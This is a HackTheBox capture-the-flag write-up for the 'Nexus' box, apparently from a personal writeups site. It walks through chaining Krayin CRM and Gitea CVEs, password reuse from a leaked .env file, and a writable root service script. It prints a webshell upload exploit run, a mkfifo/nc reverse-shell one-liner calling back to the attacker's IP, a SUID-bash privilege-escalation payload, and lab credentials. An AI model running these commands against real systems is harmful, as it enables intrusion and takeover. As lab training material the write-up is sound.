---
title: "Nexus"
type: docs
tags:
  - htb
  - linux
  - easy
  - krayin-crm
  - file-upload
  - gitea
  - git-history
  - pspy
  - suid
  - cve-2026-41452
  - cve-2026-38526
  - cve-2026-60004
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu, nginx 1.24), **Difficulty:** Easy, **IP:** 10.129.109.226 → `nexus.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Recon**, 22 / 80. Vhost fuzzing finds `git.nexus.htb` and `billing.nexus.htb`.
2. `billing.` runs **Krayin CRM**. Chain **CVE-2026-41452** (register an admin account) → **CVE-2026-38526** (authenticated unrestricted upload to `/admin/tinymce/upload`) → PHP webshell → shell as `www-data`.
3. **www-data → jones**, `/var/www/krayin/.env` leaks the DB password; it is reused by the system user `jones` → user flag.
4. **jones → git**, `jones` can log into the self-hosted Gitea (`git.nexus.htb`, running as the `git` user). The repo `admin/krayin-docker-setup` has a **deleted `.env` password in its git history**. Exploiting **CVE-2026-60004** in Gitea as `jones` gives a shell as `git`, which can write to `/etc/gitea/`.
5. **git → root**, `pspy` reveals a root systemd oneshot, `gitea-template-sync.service`, running `/etc/gitea/template-sync.py`. As `git` we can edit that script; add `os.system('chmod u+s /bin/bash')`, wait for it to fire, then `bash -p` → **root**.

</div>

<div class="callout callout-key">

**Loot**

| User | Secret |
| --- | --- |
| Krayin DB (`.env` on host) | `krayin` : `y27xb3ha!!74GbR` |
| Krayin DB (deleted from git history) | `krayin` : `N27xh!!2ucY04` |
| `jones` (password reuse) | `y27xb3ha!!74GbR` |
| **user.txt** | `518d2cee15d8871c37b2a592222712a8` |
| **root.txt** | `04ba5f220b214092c9531efaca3fa350` |

</div>

---

## Overview

Nexus turned out to be a long "chain of five" easy box, and what made it interesting wasn't any single exploit but the discipline of following credentials and version numbers from one service to the next without losing the thread. I found two vhosts (Krayin CRM and a self-hosted Gitea instance), chained three separate application CVEs, watched one password get reused three separate times, chased a secret buried in git history that turned out to be an older, dead-end credential, and finished the box off through a writable script sitting inside a root-owned systemd oneshot. None of the individual steps required custom exploit development, but the box punished sloppy note-taking: I had to track which credential unlocked which account, which Gitea repository held which secret, and, critically, that the Gitea process ran as the `git` system user directly on the host rather than inside a container, which meant any RCE against Gitea would land as a real local shell rather than a throwaway sandbox.

I've tied this into a few other boxes I've written up that share pieces of this chain. On the Gitea side there's [Cat](/writeups/hackthebox/linux/medium/cat/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), and [Drive](/writeups/hackthebox/linux/hard/drive/). For the "leaked `.env` leads to password reuse on a system account" pattern, I'd point to [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/) and [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/). And for the "writable script inside a root service or cron job" finish, [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Inject](/writeups/hackthebox/linux/easy/inject/), and [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/) all follow the same shape.

---

## Reconnaissance

### Port scan

```bash
nmap -vv -sC -sV -T4 -Pn 10.129.109.226 --script=http-headers,vuln
```

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
|   [vulners: SSH 9.6p1 - long CVE list, nothing directly exploitable here]
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-headers:
|   Server: nginx/1.24.0 (Ubuntu)
|   Location: http://nexus.htb/
|_  (Request type: GET)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add `nexus.htb` to `/etc/hosts`.

### Virtual host discovery

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -H "Host: FUZZ.nexus.htb" -u 'http://nexus.htb/' -c --fw 4
```

```console
git       [Status: 200, Size: 14472, Words: 1195, Lines: 242]
billing   [Status: 302, Size: 390,   Words: 60,   Lines: 12]
```

- `git.nexus.htb`, a **Gitea** instance
- `billing.nexus.htb`, redirects (302), turns out to be **Krayin CRM**

---

## Foothold, Krayin CRM (billing.nexus.htb)

### 1. Admin account takeover, CVE-2026-41452

`billing.nexus.htb` runs **Krayin CRM**. It is vulnerable to **CVE-2026-41452** (authenticated admin account takeover / registration bypass), we can self-register a full administrator and log into the admin portal.

```console
$ python3 poc_cve-2026-41452.py http://billing.nexus.htb baphomet pwned@attacker.local 'P@ssw0rd123!'
[*] Target: http://billing.nexus.htb
[*] New admin: baphomet <pwned@attacker.local> / P@ssw0rd123!
[0] NON-AJAX POST -> HTTP 302 Location=http://billing.nexus.htb/admin/dashboard
    [OK] blocked by CanInstall (redirect to /admin/dashboard) - middleware works
```

### 2. Unrestricted file upload → RCE, CVE-2026-38526

Authenticated as admin, chain **CVE-2026-38526**: the `/admin/tinymce/upload` endpoint performs no extension/type validation, so we can upload a `.php` webshell into `/storage/tinymce/`.

```console
$ python3 exploit.py -u http://billing.nexus.htb -e pwned@attacker.local -p 'P@ssw0rd123!' \
      --lhost 10.10.17.59 --lport 9001
[+] Login successful
[+] Webshell uploaded: http://billing.nexus.htb/storage/tinymce/0b8584c772a300af419638c3b65e10e2.php
[*] Sending encoded reverse shell...
[+] Reverse shell payload sent! Check your listener.
```

```bash
nc -lvnp 9001        # -> shell as www-data
```

---

## Privilege Escalation, www-data → jones

The Krayin app root holds the database config:

```ini
# /var/www/krayin/.env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
```

The only other real user on the box is **jones**, the DB password is reused:

```console
jones@nexus:~$ cat user.txt
518d2cee15d8871c37b2a592222712a8
```

---

## jones → git (Gitea)

`jones` reuses the same password to authenticate to **`git.nexus.htb`**. Notes about the Gitea instance:

- it is hosted **on the box itself** (not a container), running as the **`git`** system user, so any RCE against Gitea lands as `git`.
- interesting repo: `git.nexus.htb/admin/krayin-docker-setup`, contains `.env`, `docker-compose.yml`, and a file called `documents`.

### Secret in git history

The commit history shows `admin@nexus.htb` **removed a hard-coded DB password** from `.env`:

```diff
 DB_DATABASE=krayin
 DB_USERNAME=krayin
-DB_PASSWORD=N27xh!!2ucY04
+DB_PASSWORD=
 DB_PREFIX=
```

<div class="callout callout-note">

`N27xh!!2ucY04` didn't work for `root` SSH, `su root`, or the Gitea `admin` account, it's a rabbit hole / older credential, but worth recording.

</div>

### Gitea RCE, CVE-2026-60004 → shell as git

```bash
python3 cve-2026-60004-poc.py --url http://git.nexus.htb --mode semi-auto \
  --user jones --pw 'y27xb3ha!!74GbR' \
  --cmd 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.17.59 9003 >/tmp/f'
```

→ reverse shell as **git** (which can write to `/etc/gitea/`).

---

## git → root (writable script in a root service)

Live process auditing with `pspy` shows Gitea internals plus a periodic **root** job touching `/etc/gitea/`:

```console
2026/09/01 01:28:02 CMD: UID=0  ... /usr/bin/python3 /etc/gitea/template-sync.py
```

The unit:

```ini
# /etc/systemd/system/gitea-template-sync.service
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

`template-sync.py` lives in `/etc/gitea/`, which the `git` user owns. Append a payload:

```python
import os
os.system('chmod u+s /bin/bash')
```

When the oneshot next fires it runs the script as root:

```console
jones@nexus:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash

jones@nexus:~$ bash -p
bash-5.2# cat /root/root.txt
04ba5f220b214092c9531efaca3fa350
```

🏁 **Rooted.**

---

## Lessons and Takeaways

- **Keep a credentials matrix during multi service boxes.** `y27xb3ha!!74GbR` unlocked the Krayin DB, the `jones` shell, and the Gitea login. Try every secret against every account and service.
- **Secrets in git history never go away.** `git log -p`, `git show`, and tools like `trufflehog` recover a password even after a "remove hardcoded password" commit. Rotate anything that was ever committed.
- **Run Gitea (and any web app) as a dedicated, unprivileged user in a container.** Here it runs as `git` on the host, so a Gitea CVE is a host shell.
- **Nothing in `/etc/gitea/` should be writable by the `git` user if root executes it.** A root systemd oneshot pointed at an app owned script is a direct privilege escalation.
- **`pspy` is mandatory for privesc.** The root job here is a `oneshot` unit with no cron entry and nothing in `sudo -l`.

---

## Related Writeups

- **Gitea:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Titanic](/writeups/hackthebox/linux/easy/titanic/), [Drive](/writeups/hackthebox/linux/hard/drive/)
- **App `.env` then password reuse:** [TwoMillion](/writeups/hackthebox/linux/easy/twomillion/), [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Unrestricted file upload to webshell:** [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Usage](/writeups/hackthebox/linux/easy/usage/)
- **Writable script inside a root service or cron:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Inject](/writeups/hackthebox/linux/easy/inject/), [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)
- **Secret in git history / `.git` disclosure:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Dog](/writeups/hackthebox/linux/easy/dog/), [Enterprise](/writeups/tryhackme/windows/hard/enterprise/)

## References

- Krayin CRM security advisories <https://github.com/krayin/laravel-crm/security/advisories>
- Gitea security advisories <https://github.com/go-gitea/gitea/security/advisories>
- pspy <https://github.com/DominicBreuker/pspy>
- trufflehog (git history secrets) <https://github.com/trufflesecurity/trufflehog>
